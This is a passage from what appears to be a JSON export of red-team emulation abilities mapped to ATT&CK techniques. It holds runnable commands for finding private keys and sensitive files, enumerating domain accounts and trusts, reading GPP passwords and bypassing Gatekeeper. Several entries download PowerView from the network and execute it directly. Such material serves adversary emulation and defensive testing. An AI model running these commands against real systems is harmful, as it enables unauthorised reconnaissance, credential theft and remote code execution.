"technique_name": "System Information Discovery", "ability_id": "30732a56-4a23-4307-9544-09caf2ed29d5", "technique_id": "T1082", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "host.user.name"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Find deletable dirs (per user)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Locate files deemed sensitive", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_extension", "target": "file.sensitive.extension", "source": "host.file.path"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_extension", "target": "file.sensitive.extension", "source": "host.file.path"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_extension", "target": "file.sensitive.extension", "source": "host.file.path"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;", "language": null, "name": "pwsh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_extension", "target": "file.sensitive.extension", "source": "host.file.path"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data from Local System", "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "technique_id": "T1005", "tactic": "collection", "requirements": [], "name": "Find files", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "84a93e5157b690ee0f585cd55c15b0cb", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Find local admins on all machines in domain (PowerView)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get a list of all local users", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Find local users", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "03c8721619373b6c18a55721a33cad2c", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Find machines where user has local admin access (PowerView)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find private keys on the file system", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")", "language": null, "name": "cmd", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "de632c2d-a729-4b77-b781-6a6b09c148ba", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "Find private keys", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get process info for processes running as a user", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ps aux | grep #{host.user.name}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ps aux | grep #{host.user.name}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "technique_id": "T1057", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "host.user.name"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Find user processes", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses nmap to fingerprint services that were network accessible", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Service Scanning", "ability_id": "3a2ce3d5-e9e2-4344-ae23-470432ff8687", "technique_id": "T1046", "tactic": "discovery", "requirements": [], "name": "Fingerprint network services", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ". PathToAtomicsFolder\\T1552.006\\src\\Get-GPPPassword.ps1; Get-GPPPassword -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Group Policy Preferences", "ability_id": "410108b9909252e207bfaa7d92a117f4", "technique_id": "T1552.006", "tactic": "credential-access", "requirements": [], "name": "GPP Passwords (Get-GPPPassword)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Group Policy Preferences", "ability_id": "53d863a190b41b6af474be875b74784b", "technique_id": "T1552.006", "tactic": "credential-access", "requirements": [], "name": "GPP Passwords (findstr)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Gatekeeper Bypass via command line\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo xattr -d com.apple.quarantine myapp.app", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Gatekeeper Bypass", "ability_id": "3de595bb54ec62ed3f18531ccee1da3f", "technique_id": "T1553.001", "tactic": "defense-evasion", "requirements": [], "name": "Gatekeeper Bypass", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get Chrome Bookmarks", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.bookmarks", "parserconfigs": [{"custom_parser_vals": {}, "edge": "resolves_to", "target": "host.chrome.bookmark_url", "source": "host.chrome.bookmark_title"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Browser Bookmark Discovery", "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25", "technique_id": "T1217", "tactic": "discovery", "requirements": [], "name": "Get Chrome Bookmarks", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "get current system time (ISO 8601)", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.current.time"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.current.time"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.current.time"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Time Discovery", "ability_id": "fa6e8607-e0b1-425d-8924-9b894da5a002", "technique_id": "T1124", "tactic": "discovery", "requirements": [], "name": "Get System Time", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "42102f01777d40a7db982282c4c791e9", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "aaeee9107989a507f526b0cef1cb274f", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Get-DomainController with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Group Policy Discovery", "ability_id": "38714562d32f33dc32bd7aef553771d9", "technique_id": "T1615", "tactic": "discovery", "requirements": [], "name": "Get-DomainGPO to display group policy information via PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "57781057e51ffecf21e38fd31c9d2f79", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Get-DomainGroup with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "2594698a8e38a85b0d98468d87b49821", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Get-DomainGroupMember with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "214be4092770061080ef0781c26bab3e", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Get-DomainPolicy with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "53571e9988b92014f9d71888936d3878", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "Get-DomainTrust with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "c84a57391dbc724dc51436deb3e0ca00", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Get-DomainUser with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting", "ability_id": "e0c75b4cc32124ef4c61508694fd0808", "technique_id": "T1558.004", "tactic": "credential-access", "requirements": [], "name": "Get-DomainUser with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "feb9647c55185e3b6045293fd26f6a5b", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "Get-ForestTrust with PowerView", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-wmiobject -class ds_computer -namespace root\\directory\\ldap", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "8be175eb24a31c5765554a8d8f70fc9a", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Get-wmiobject to Enumerate Domain Controllers", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get Administrator users for a computer", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["powerview.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "parserconfigs": [{"custom_parser_vals": {"json_key": "samaccountname", "json_type": "str"}, "edge": "", "target": "", "source": "domain.user.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "GetAdminMembers", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get a list of all computers in a domain", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["powerview.ps1"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "GetComputers (Alice)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path .\\CurrentUserObject.txt -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "221d4ebcb41e708b6ee90c1c0369a969", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "GetCurrent User with PowerShell Script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Determine the Windows Domain of a computer", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["powerview.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "parserconfigs": [{"custom_parser_vals": {"json_key": "Forest", "json_type": "str"}, "edge": "", "target": "", "source": "domain.ad.forest"}, {"custom_parser_vals": {"json_key": "Name", "json_type": "str"}, "edge": "", "target": "", "source": "domain.ad.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "6131397e-7765-424e-a594-3d7fb2d93a6a", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "GetDomain", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get Service Accounts for a domain", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["powerview.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "parserconfigs": [{"custom_parser_vals": {"json_key": 